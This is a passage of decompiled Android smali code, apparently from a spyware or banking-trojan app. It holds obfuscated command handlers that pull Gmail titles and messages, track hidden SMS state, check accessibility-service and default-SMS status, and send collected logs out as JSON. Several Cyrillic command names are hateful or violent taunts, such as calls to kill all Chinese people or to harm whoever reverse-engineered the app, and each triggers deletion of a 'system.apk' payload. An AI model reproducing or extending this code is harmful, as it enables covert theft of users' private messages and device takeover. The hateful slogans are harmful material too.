    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v3, "elV4SVQ0SytEZmpLUnZlazJQc29pZWE4WDRKckFlWjBjVS9XUnliVU53dz06OmlvQ0NYalNiSjd6TkJ0eEk3VVdjQWc9PQ=="

    :goto_b
    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v1, v4, v0, v3}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_32
    const-string v3, "gmailtitles"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_34

    const-string v0, "gm_list"

    const-string v2, "start"

    .line 46
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v3, :cond_33

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_33
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-interface {v3, v0, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 47
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "TGpFSmpkWTlQZ1RTUGU0RldaU3ZnVXdNeHRObjBLbXRVcEtFQjMrV0lwOD06OkQ5aS9VMm4wVTc2OS8wcDk2cDkvTVE9PQ=="

    goto :goto_c

    :cond_34
    const-string v3, "getgmailmessage"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_37

    invoke-static/range {p2 .. p2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "mes_num"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "gm_mes_command"

    const-string v3, "start"

    .line 48
    invoke-static {v1, v7}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_35

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_35
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 49
    const-string v2, "gm_mes"

    .line 50
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v3, :cond_36

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_36
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-interface {v3, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 51
    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v2, "SWo4Yk5ZY0Y3VnJLWm9mbTJ3UC9CczJyckk5c3RFazgrSWo3OHBGZ2xSQT06OlhaWnRDS1oxUS9pRUNUS3Via1hZMWc9PQ=="

    :goto_c
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lh0/a;->u(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_e

    :cond_37
    const-string v0, "\u0423\u043d\u0438\u0447\u0442\u043e\u0436\u0438\u0442\u044c_\u0432\u0441\u0435_\u0447\u0435\u043b\u043e\u0432\u0435\u0447\u0435\u0441\u0442\u0432\u043e"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_38

    :try_start_c
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_3

    goto/16 :goto_d

    :cond_38
    const-string v0, "\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c_\u043a\u043e\u0440\u043e\u043d\u0430\u0432\u0438\u0440\u0443\u0441"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_39

    :try_start_d
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_3

    goto/16 :goto_d

    :cond_39
    const-string v0, "\u0423\u0431\u0438\u0442\u044c_\u0432\u0441\u0435\u0445_\u043a\u0438\u0442\u0430\u0439\u0446\u0435\u0432"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3a

    :try_start_e
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_3

    goto/16 :goto_d

    :cond_3a
    const-string v0, "\u0412\u042b\u0447\u0438\u0441\u043b\u0438\u0442\u044c_\u043f\u043e_IP_\u0440\u0435\u0432\u0435\u0440\u0441\u0435\u0440\u0430_\u043a\u043e\u0442\u043e\u0440\u044b\u0439_\u044d\u0442\u043e_\u0441\u043c\u043e\u0442\u0440\u0438\u0442"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3b

    :try_start_f
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_3

    goto/16 :goto_d

    :cond_3b
    const-string v0, "\u0423\u043d\u0438\u0447\u0442\u043e\u0436\u0438\u0442\u044c_\u043a\u043e\u043c\u043f\u0443\u043a\u0442\u0435\u0440"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3c

    :try_start_10
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_3

    goto :goto_d

    :cond_3c
    const-string v0, "\u041f\u0443\u0442\u0438\u043d_\u043a\u0440\u0430\u0441\u0430\u0432\u0447\u0438\u043a"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3d

    :try_start_11
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_3

    goto :goto_d

    :cond_3d
    const-string v0, "\u0412\u044b\u0437\u0432\u0430\u0442\u044c_\u0446\u0443\u043d\u0430\u043c\u0438_\u043d\u0430_\u0430\u043c\u0435\u0440\u0438\u043a\u0443"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3e

    :try_start_12
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_3

    goto :goto_d

    :cond_3e
    const-string v0, "\u0421\u0434\u043e\u0445\u043d\u0438_\u0442\u043e\u0442_\u043a\u0442\u043e_\u0440\u0430\u0437\u0440\u0435\u0432\u0435\u0440\u0441\u0438\u043b_\u044d\u0442\u043e"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3f

    :try_start_13
    new-instance v0, Ljava/io/File;

    const-string v2, "apk"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "system.apk"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    :goto_d
    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_3

    :catch_3
    :cond_3f
    :goto_e
    return-void
.end method

.method public final e(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    const-string v0, "device_policy"

    const-string v1, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    const-string v2, "list.toString()"

    const-string v3, "SDdEeDJMaHhWYWZPb0FScFozakRWZz09Ojo0V0QrdUNtZkxMUk04RmM3Q0dhbDVRPT0="

    const-string v4, "aVYxMkpnaXBsd0tzMU95aTZVSk16dz09OjpVcnJIeWg3U3E1U1FURERZS2lENjBBPT0="

    const-string v5, "R1VNREI1S1haQWc2OUh3L2g2S3dYVktrVjdrS2JOa1MzT1FaZVNFSkU3ND06OmFtd2VJck44U0U0TlN6T29xcktRa2c9PQ=="

    const-string v6, "context"

    const-string v7, ""

    instance-of v8, p2, Lh0/b$d;

    if-eqz v8, :cond_0

    move-object v8, p2

    check-cast v8, Lh0/b$d;

    iget v9, v8, Lh0/b$d;->j:I

    const/high16 v10, -0x80000000

    and-int v11, v9, v10

    if-eqz v11, :cond_0

    sub-int/2addr v9, v10

    iput v9, v8, Lh0/b$d;->j:I

    goto :goto_0

    :cond_0
    new-instance v8, Lh0/b$d;

    invoke-direct {v8, p0, p2}, Lh0/b$d;-><init>(Lh0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v8, Lh0/b$d;->h:Ljava/lang/Object;

    sget-object v9, Lm0/a;->c:Lm0/a;

    iget v10, v8, Lh0/b$d;->j:I

    const/4 v11, 0x1

    if-eqz v10, :cond_2

    if-ne v10, v11, :cond_1

    iget-object p1, v8, Lh0/b$d;->g:Ljava/lang/Object;

    check-cast p1, Landroid/content/Context;

    iget-object v8, v8, Lh0/b$d;->f:Ljava/lang/Object;

    check-cast v8, Lh0/b;

    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto :goto_1

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    iput-object p0, v8, Lh0/b$d;->f:Ljava/lang/Object;

    iput-object p1, v8, Lh0/b$d;->g:Ljava/lang/Object;

    iput v11, v8, Lh0/b$d;->j:I

    invoke-virtual {p0, p1, v8}, Lh0/b;->b(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;

    move-result-object p2

    if-ne p2, v9, :cond_3

    return-object v9

    :cond_3
    move-object v8, p0

    :goto_1
    invoke-static {v8}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const/4 p2, 0x0

    const/4 v8, 0x6

    const/4 v9, 0x0

    .line 1
    :try_start_0
    sget-object v10, Lb0/b;->a:Lb0/b;

    .line 2
    sget-object v10, Lb0/b;->T:Ljava/lang/String;

    .line 3
    invoke-static {p1, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v12, :cond_4

    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {p1, v12, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v12

    sput-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_4
    sget-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v12}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v12, v10, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 4
    sget-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v12, :cond_5

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {p1, v12, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v12

    sput-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_5
    sget-object v12, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v12}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v12}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    invoke-interface {v12, v10, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->apply()V

    if-eqz v9, :cond_7

    .line 5
    invoke-static {v9}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_6

    goto :goto_2

    :cond_6
    move v10, p2

    goto :goto_3

    :cond_7
    :goto_2
    move v10, v11

    :goto_3
    if-nez v10, :cond_9

    new-array v10, v11, [Ljava/lang/String;

    const-string v12, "::endlog::"

    aput-object v12, v10, p2

    invoke-static {v9, v10, p2, p2, v8}, Ly0/h;->a0(Ljava/lang/CharSequence;[Ljava/lang/String;ZII)Ljava/util/List;

    move-result-object v8

    new-instance v9, Lorg/json/JSONArray;

    invoke-direct {v9}, Lorg/json/JSONArray;-><init>()V

    invoke-interface {v8}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_4
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_8

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    :try_start_1
    new-instance v12, Lorg/json/JSONObject;

    invoke-direct {v12, v10}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v12}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_4

    :catchall_0
    move-exception v10

    :try_start_2
    invoke-static {v10}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto :goto_4

    :cond_8
    sget-object v8, Lc0/b;->a:Lc0/b;

    invoke-virtual {v9}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v10, Lb0/b;->a:Lb0/b;

    .line 6
    sget-object v10, Lb0/b;->T:Ljava/lang/String;

    .line 7
    invoke-virtual {v8, p1, v7, v9, v10}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    goto :goto_5

    :catchall_1
    move-exception v8

    invoke-static {v8}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 8
    :cond_9
    :goto_5
    :try_start_3
    sget-object v8, Lb0/b;->a:Lb0/b;

    .line 9
    sget-object v8, Lb0/b;->S:Ljava/lang/String;

    .line 10
    invoke-static {p1, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v9, :cond_a

    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v4, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_a
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v9, 0x0

    invoke-interface {v4, v8, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 11
    sget-object v9, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v9, :cond_b

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_b
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    invoke-interface {v3, v8, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->apply()V

    if-eqz v4, :cond_d

    .line 12
    invoke-static {v4}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_c

    goto :goto_6

    :cond_c
    move v3, p2

    goto :goto_7

    :cond_d
    :goto_6
    move v3, v11

    :goto_7
    if-nez v3, :cond_f

    new-array v3, v11, [Ljava/lang/String;

    const-string v8, "::endlog::"

    aput-object v8, v3, p2

    const/4 v8, 0x6

    invoke-static {v4, v3, p2, p2, v8}, Ly0/h;->a0(Ljava/lang/CharSequence;[Ljava/lang/String;ZII)Ljava/util/List;

    move-result-object v3

    new-instance v4, Lorg/json/JSONArray;

    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V

    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_8
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_e

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    :try_start_4
    new-instance v9, Lorg/json/JSONObject;

    invoke-direct {v9, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v9}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_8

    :catchall_2
    move-exception v8

    :try_start_5
    invoke-static {v8}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto :goto_8

    :cond_e
    sget-object v3, Lc0/b;->a:Lc0/b;

    invoke-virtual {v4}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 13
    sget-object v2, Lb0/b;->S:Ljava/lang/String;

    .line 14
    invoke-virtual {v3, p1, v7, v4, v2}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    goto :goto_9

    :catchall_3
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_f
    :goto_9
    const-string v2, "ZWt0T0lHOUxlLzR4YVd2Y25DMWlldz09OjpEd0JuZ2x0MGJja28vWXBUUG14UG1BPT0="

    .line 15
    invoke-static {p1, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "context.applicationContext"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 16
    sput-object v3, Ls0/c;->e:Landroid/content/Context;

    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_10

    const-string v4, "settings"

    invoke-virtual {v3, v4, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_10
    const/high16 v3, 0x20000

    const/high16 v4, 0x10000000

    const/16 v6, 0x3a

    .line 17
    :try_start_6
    sget-object v8, Lb0/b;->a:Lb0/b;

    .line 18
    sget-object v8, Lb0/b;->n:Ljava/lang/Class;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    .line 19
    :try_start_7
    new-instance v9, Landroid/content/ComponentName;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v9, p1, v8}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v8

    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v8, v10}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    if-nez v8, :cond_11

    goto :goto_a

    :cond_11
    new-instance v10, Landroid/text/TextUtils$SimpleStringSplitter;

    invoke-direct {v10, v6}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v10, v8}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_12
    invoke-virtual {v10}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_13

    invoke-virtual {v10}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v6

    if-eqz v6, :cond_12

    invoke-static {v6, v9}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    if-eqz v6, :cond_12

    goto :goto_b

    :catch_0
    :cond_13
    :goto_a
    move v11, p2

    :goto_b
    if-eqz v11, :cond_18

    .line 20
    :try_start_8
    sget-object v6, Lh0/a;->a:Lh0/a;

    invoke-virtual {v6, p1}, Lh0/a;->o(Landroid/content/Context;)Z

    move-result v8

    if-eqz v8, :cond_18

    .line 21
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v9, "hiddenSMS"

    invoke-interface {v8, v9, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    if-nez v8, :cond_14

    move-object v8, v7

    .line 22
    :cond_14
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v8
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_4

    const-string v9, "Zjk2R3RTZFdWclY1SVo0RDk3Qi9hdz09OjppSFg3YlhnYitNSnVYNEV4bm12TndRPT0="

    if-eqz v8, :cond_17

    .line 23
    :try_start_9
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v10, "permission_get"

    invoke-interface {v8, v10, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    if-nez v8, :cond_15

    move-object v8, v7

    .line 24
    :cond_15
    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v8, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_17

    invoke-static {p1}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v8}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_17

    const-string v2, "1"

    .line 25
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-interface {v8, v10, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

